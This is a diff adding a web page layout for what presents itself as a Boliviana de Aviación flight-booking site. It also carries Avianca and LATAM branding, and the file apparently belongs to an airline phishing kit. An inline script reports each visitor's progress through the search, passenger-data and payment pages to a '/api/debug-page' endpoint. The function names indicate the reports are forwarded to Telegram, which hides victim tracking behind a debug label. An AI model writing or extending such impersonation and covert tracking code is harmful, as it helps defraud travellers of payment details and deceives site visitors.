@@ -1,0 +1,104 @@
+---
+import '../styles/global.css';
+import '../styles/avianca.css';
+import '../styles/boa.css';
+
+interface Props {
+  title?: string;
+  description?: string;
+  bodyClass?: string;
+}
+
+const {
+  title = 'Reserva vuelos nacionales e internacionales | BoA - Boliviana de Aviación',
+  description = 'Reserva vuelos nacionales e internacionales con Boliviana de Aviación.',
+  bodyClass = '',
+} = Astro.props;
+---
+
+<!doctype html>
+<html lang="es-GT">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content={description} />
+    <link rel="icon" type="image/svg+xml" href="/favicon-boa.svg" />
+    <link rel="shortcut icon" href="/favicon-boa.svg" />
+    <title>{title}</title>
+<!-- Meta Pixel Code -->
+<script is:inline>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '950663504721055');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=950663504721055&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<!-- Google tag (gtag.js) -->
+<script is:inline async src="https://www.googletagmanager.com/gtag/js?id=AW-18343297036"></script>
+<script is:inline>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-18343297036');
+</script>
+  </head>
+  <body class={bodyClass}>
+    <slot />
+    <script is:inline>
+      (function () {
+        window.__latamTgSent = window.__latamTgSent || {};
+        const PAGE_MESSAGES = {
+          '/': 'Buscando vuelos',
+          '/reservar': 'Buscando vuelos',
+          '/resumen-viaje': 'Viendo resumen de vuelos',
+          '/datos-pasajero': 'Viendo resumen de vuelos',
+          '/pasajeros': 'Datos de pasajero',
+          '/tienda': 'Escogiendo maletas',
+          '/pagos': 'Pagina de pago',
+          '/success': 'Compra exitosa',
+        };
+
+        function sendTelegramStep(event) {
+          if (!event) return;
+          if (window.__latamTgSent[event]) return;
+          window.__latamTgSent[event] = true;
+          try {
+            const key = 'latam-tg:' + event;
+            if (sessionStorage.getItem(key)) return;
+            sessionStorage.setItem(key, '1');
+          } catch {
+            /* ignore */
+          }
+          fetch('/api/debug-page', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ event: event }),
+            keepalive: true,
+          }).catch(function () {});
+        }
+
+        function pageStep(pathname) {
+          const clean = pathname.replace(/\/+$/, '') || '/';
+          if (clean === '/prueba-telegram') return '';
+          if (clean === '/seleccion-asientos') return 'Escogiendo asiento ida';
+          return PAGE_MESSAGES[clean] || '';
+        }
+
+        window.sendTelegramStep = sendTelegramStep;
+        if (window.__latamTgPageBoot) return;
+        window.__latamTgPageBoot = true;
+        sendTelegramStep(pageStep(window.location.pathname));
+      })();
+    </script>
+  </body>
+</html>
